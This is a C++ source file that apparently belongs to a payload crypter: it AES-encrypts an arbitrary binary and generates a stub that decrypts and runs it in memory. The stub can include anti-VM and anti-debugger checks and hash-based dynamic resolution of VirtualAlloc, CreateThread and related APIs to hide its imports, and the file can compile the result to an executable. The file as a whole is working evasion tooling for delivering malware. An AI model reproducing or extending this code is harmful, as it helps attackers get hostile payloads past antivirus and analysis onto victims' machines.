// utils.cpp
#include "utils.h"
#include "flags.h"
#include "placeholders.h"
#include "constant.h"
#include "stubstr.h"
/**/


// windows.h byte definition has conflicts

#include <iostream>
#include <sstream>
#include <iomanip>
#include <fstream>
#include <cstring>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <openssl/evp.h>
#include <filesystem>
#include <random>
#include <regex>

using namespace std;

void setColor(int color) {
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), color);
}

void resetColor() {
    setColor(COLOR_DEFAULT);
}

string bytesToHexString(const vector<unsigned char> &bytes) {
    stringstream ss;
    ss << hex << setfill('0');
    for (size_t i = 0; i < bytes.size(); ++i) {
        ss << "0x" << setw(2) << static_cast<int>(bytes[i]);
        if (i < bytes.size() - 1) {
            ss << ", ";
        }
    }
    return ss.str();
}

string generateRandomString(size_t length) {
    const char charset[] =
        "abcdefghijklmnopqrstuvwxyz"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "0123456789";
    const size_t max_index = (sizeof(charset) - 1);
    string randomString(length, 0);
    random_device rd;
    mt19937 generator(rd());
    uniform_int_distribution<> distribution(0, max_index);

    for (size_t i = 0; i < length; ++i) {
        randomString[i] = charset[distribution(generator)];
    }

    return randomString;
}

DWORD getHashFromString(const char *string){
    size_t strlength = strnlen_s(string, 50);
    DWORD hash = 0x35;

    for(size_t i = 0; i < strlength; i++){
        hash += (hash * 0xab10f29fa + string[i]) & 0xffffffa;
    }

    return hash;
}

vector<unsigned char> readBinary(string &path_to_payload) {
    ifstream file(path_to_payload, ios::binary | ios::ate);
    setColor(COLOR_ERROR);
    if (!file) {
        cerr << "Could not open binary\n";
        resetColor();
        return {};
    }

    streamsize len = file.tellg();
    file.seekg(0, ios::beg);

    vector<char> buf(len);
    if (!file.read(buf.data(), len)) {
        std::cerr << "Error reading binary\n";
        resetColor();
        return {};
    }
    resetColor();
    file.close();
    
    // Convert from char vector to unsigned char vector 
    vector<unsigned char> payloadBytes(buf.begin(), buf.end());

    return payloadBytes;
}

pair <vector<unsigned char>, vector<unsigned char>> generateKeyAndIV(size_t keySize, size_t ivSize) {
    vector<unsigned char> key(keySize);
    vector<unsigned char> iv(ivSize);
    
    if (!RAND_bytes(key.data(), keySize) || !RAND_bytes(iv.data(), ivSize)) {
        setColor(COLOR_ERROR);
        cerr << "error generating key and IV\n";
        resetColor();
        exit(1);
    }

    return make_pair(key, iv);

}

vector<unsigned char> encrypt(const vector<unsigned char> &buf, const vector<unsigned char> &key, const vector<unsigned char> &iv) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    
    if (!ctx) {
        cerr << "Encryption CTX error\n";
        exit(1);
    }

    if (EVP_EncryptInit_ex(ctx, EVP_aes_128_cfb8(), NULL, key.data(), iv.data()) != 1) {
        cerr << "Encryption error\n";
        EVP_CIPHER_CTX_free(ctx);
        exit(1);
    }

    vector<unsigned char> ciphertext(buf.size());
    int len;

    if (EVP_EncryptUpdate(ctx, ciphertext.data(), &len, buf.data(), buf.size()) != 1) {
        cerr << "Encryption failed\n";
        EVP_CIPHER_CTX_free(ctx);
        exit(1);
    }

    EVP_CIPHER_CTX_free(ctx);

    return ciphertext;
}

vector<unsigned char> decrypt(const vector<unsigned char> &buf, const vector<unsigned char> &key, const vector<unsigned char> &iv) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        setColor(COLOR_ERROR);
        cerr << "Decryption CTX error\n";
        resetColor();
        exit(1);
    }

    if (EVP_DecryptInit_ex(ctx, EVP_aes_128_cfb8(), NULL, key.data(), iv.data()) != 1) {
        setColor(COLOR_ERROR);
        cerr << "Decryption error\n";
        EVP_CIPHER_CTX_free(ctx);
        resetColor();
        exit(1);
    }

    vector<unsigned char> plaintext(buf.size());
    int len;

    if (EVP_DecryptUpdate(ctx, plaintext.data(), &len, buf.data(), buf.size()) != 1) {
        setColor(COLOR_ERROR);
        cerr << "Decryption failed\n";
        EVP_CIPHER_CTX_free(ctx);
        resetColor();
        exit(1);
    }

    EVP_CIPHER_CTX_free(ctx);

    return plaintext;
}

void replaceAPICalls(string &line, const map<string, string> &replacements) {
    for (const auto &pair : replacements) {
        regex apiRegex("\\b" + pair.first + "\\b");
        line = regex_replace(line, apiRegex, pair.second);
    }
}

void writeStub(bool *flags, string &stub_name, string &stubTemplatePath, string &outputDirPath, const vector<unsigned char> &payloadBytes, const vector<unsigned char> &key, const vector<unsigned char> &iv) {
    setColor(COLOR_INFO);
    cout << "\nWriting stub...\n";
    resetColor();

    ifstream file(stubTemplatePath);
    if (!file) {
        setColor(COLOR_ERROR);
        cerr << "Could not open stub template\n";
        resetColor();
        exit(1);
    }
    
    string name;
    string outputPath;
    filesystem::create_directories(outputDirPath);

    if(flags[NAME] == true){
        name = stub_name;
        outputPath = outputDirPath + "stub_" + name + ".cpp";
    } else {
        name = generateRandomString(8);
        outputPath = outputDirPath + "stub_" + name + ".cpp";
    }

    ofstream outputFile(outputPath);
    if (!outputFile) {
        setColor(COLOR_ERROR);
        cerr << "Error writing stub\n";
        resetColor();
        exit(1);
    }
    
    // Add flags that will be set for placeholders
    // since all flags require two separate replacements the original flags array cannot be used
    bool placeholders[PLACEHOLDER_COUNT] = {false};
    char *funNames[6];
    vector<DWORD> hashes;

    if(flags[RAND]){
        placeholders[RAND_DEF_POS] = true;
        placeholders[RAND_CALL_POS] = true;
    }
    if(flags[VM]){
        placeholders[VM_DEF_POS] = true;
        placeholders[VM_CALL_POS] = true;
    }
    if(flags[DB]){
        placeholders[DB_DEF_POS] = true;
        placeholders[DB_CALL_POS] = true;
    }

    string dwordArray;
    if(flags[DYN]){
        placeholders[API_CALLS_POS] = true;
        placeholders[DYN_GLOBALS_POS] = true;
        placeholders[DYN_CALL_POS] = true;

        const char *funNames[] = {
            "VirtualAlloc",
            "VirtualFree",
            "LoadLibraryA",
            "CreateThread",
            "WaitForSingleObject",
            "CloseHandle"
        };

        vector<DWORD> hashes;
        for(int i=0; i<6; i++){
            hashes.push_back(getHashFromString(funNames[i]));
        }

        // Create a string representation of the DWORD array
        dwordArray = "DWORD fun[] = {";
        for (size_t i = 0; i < hashes.size(); ++i) {
            dwordArray += "(DWORD)" + std::to_string(hashes[i]);
            if (i < hashes.size() - 1) {
                dwordArray += ", ";
            }
        }
        dwordArray += "};";

        size_t pos = DYN_GLOBALS.find("/*DWORD_ARRAY_PLACEHOLDER*/");
        if (pos != std::string::npos) {
            DYN_GLOBALS.replace(pos, strlen("/*DWORD_ARRAY_PLACEHOLDER*/"), dwordArray);
        }
    }


    string line;
    vector<string> lines;
    
    // Copy stub template into memory 
    while(getline(file,line)){
        lines.push_back(line);
    }
    file.close();

    // Process template depending on flags and write to new file
    for(auto &line : lines){
        size_t pos;
        
        if (flags[PDB] == true){
            if ((pos = line.find("bool DEBUG = false;")) != string::npos) {
                line.replace(pos, strlen("bool DEBUG = false;"), "bool DEBUG = true;");
            }  
        } 

        // Process --vm before --dyn in any case
        if (flags[VM] == true) {
            cout << "\nsearching for vm";
            if (placeholders[VM_DEF_POS] == true) {
                if ((pos = line.find("/*VM_DEF*/")) != string::npos) {
                    line.replace(pos, strlen("/*VM_DEF*/"), ANTI_VM_DEF);
                    cout << "Set antiVM def successfully\n";
                    placeholders[VM_DEF_POS] = false;
                }
            }
            if (placeholders[VM_CALL_POS] == true) {
                if ((pos = line.find("/*VM_CALL*/")) != string::npos) {
                    line.replace(pos, strlen("/*VM_CALL*/"), "antiVm();");
                    cout << "Set antiVM call successfully\n";
                    placeholders[VM_CALL_POS] = false;
                }
            }
            if ((placeholders[VM_DEF_POS] == false) && (placeholders[VM_CALL_POS] == false)) {
                flags[VM] = false;
            }
        }

        // Replace all API calls defined here, that will be resolved dynamically
        // VM_DEF uses CloseHandle, which is why it has to be processed before
        // Has to be true every iteration when --dyn is used, so that every line
        // can be checked for the API calls
        if (placeholders[API_CALLS_POS] == true) {
            map<string, string> replacements = {
                {"VirtualAlloc", "pVirtualAlloc"},
                {"VirtualFree", "pVirtualFree"},
                {"LoadLibraryA", "pLoadLibraryA"},
                {"CreateThread", "pCreateThread"},
                {"WaitForSingleObject", "pWaitForSingleObject"},
                {"CloseHandle", "pCloseHandle"}
            };

            map<string, string> hashReplacements = {
                {"VirtualAlloc", "VA"},
                {"VirtualFree", "VF"},
                {"LoadLibraryA", "LLA"},
                {"CreateThread", "CT"},
                {"WaitForSingleObject", "WFO"},
                {"CloseHandle", "CH"}
            };

            replaceAPICalls(line, hashReplacements);
            // Since every line has to be checked this has to stay false 
            //placeholders[API_CALLS_POS] = false;
        }

        if (flags[DYN] == true) {
            if (placeholders[DYN_GLOBALS_POS]) {
                if ((pos = line.find("/*DYN_GLOBALS*/")) != string::npos) {
                    line.replace(pos, strlen("/*DYN_GLOBALS*/"), DYN_GLOBALS);
                    cout << "Set dynamic API resolution globals successfully\n";
                    placeholders[DYN_GLOBALS_POS] = false;
                }
            }
            if (placeholders[DYN_CALL_POS]) {
                if ((pos = line.find("/*DYN_CALL*/")) != string::npos) {
                    line.replace(pos, strlen("/*DYN_CALL*/"), DYN_CALL);
                    cout << "Set dynamic API resolution initialization successfully\n";
                    placeholders[DYN_CALL_POS] = false;
                }
            }
            if ((placeholders[DYN_GLOBALS_POS] == false) && (placeholders[DYN_CALL_POS] == false)) {
                flags[DYN] = false;
            }
        }

        if (flags[RAND] == true){
            if(placeholders[RAND_DEF_POS] == true){
                if ((pos = line.find("/*RAND_DEF*/")) != string::npos) {
                    line.replace(pos, strlen("/*RAND_DEF*/"), RAND_DEF);
                    cout << "Set rand def successfully\n";
                }
            }
            if(placeholders[RAND_CALL_POS] == true){
                if ((pos = line.find("vector<unsigned char> payload = decrypt(ENCRYPTED, KEY, IV);\nexecute(payload);")) != string::npos) {
                    line.replace(pos, strlen("vector<unsigned char> payload = decrypt(ENCRYPTED, KEY, IV);\nexecute(payload);"), RAND_CALL);
                    cout << "Set rand call successfully\n";
                }
            }
            if((placeholders[RAND_DEF_POS] == false) && (placeholders[RAND_CALL_POS] == false)){
                flags[RAND] = false;
            }
        }

        if (flags[DB] == true){
            if(placeholders[DB_DEF_POS] == true){
                if ((pos = line.find("/*DB_DEF*/")) != string::npos) {
                    line.replace(pos, strlen("/*DB_DEF*/"), DB_DEF);
                    cout << "Set antiDB def successfully\n";
                }
            }
            if(placeholders[DB_CALL_POS] == true){
                if ((pos = line.find("/*DB_CALL*/")) != string::npos) {
                    line.replace(pos, strlen("/*DB_CALL*/"), "antiDb();");
                    cout << "Set antiDB call successfully\n";
                }
            }
            if((placeholders[DB_CALL_POS] == false) && (placeholders[DB_DEF_POS] == false)){
                flags[DB] = false;
            }
        }

        if ((pos = line.find("/*ENCRYPTED_BYTES*/")) != string::npos) {
            line.replace(pos, strlen("/*ENCRYPTED_BYTES*/"), bytesToHexString(payloadBytes));
        }
        if ((pos = line.find("/*KEY*/")) != string::npos) {
            line.replace(pos, strlen("/*KEY*/"), bytesToHexString(key));
        } 
        if ((pos = line.find("/*IV*/")) != string::npos) {
            line.replace(pos, strlen("/*IV*/"), bytesToHexString(iv));
        } 

        outputFile << line << endl;
    }
    outputFile.close();

    setColor(COLOR_SUCCESS);
    cout << "Successfully wrote stub to: " << outputPath << "\n";
    resetColor();

    if(flags[COMPILE] == true){
        setColor(COLOR_INFO);
        cout << "\nCompiling stub...\n";
        string tmp = "make out/stub_" + name + ".exe";
        const char *command = tmp.c_str();

        int out = system(command);
        if(out == 0){
            setColor(COLOR_SUCCESS);
            cout << "Compilation successful\n";
            cout << "->\t/out/stub_" << name << ".exe\n";
        } else {
            setColor(COLOR_ERROR);
            cerr << "system(" << command << ") failed with code " << out << "\n";
            resetColor();
            exit(1);
        }
    }
    
    resetColor();
}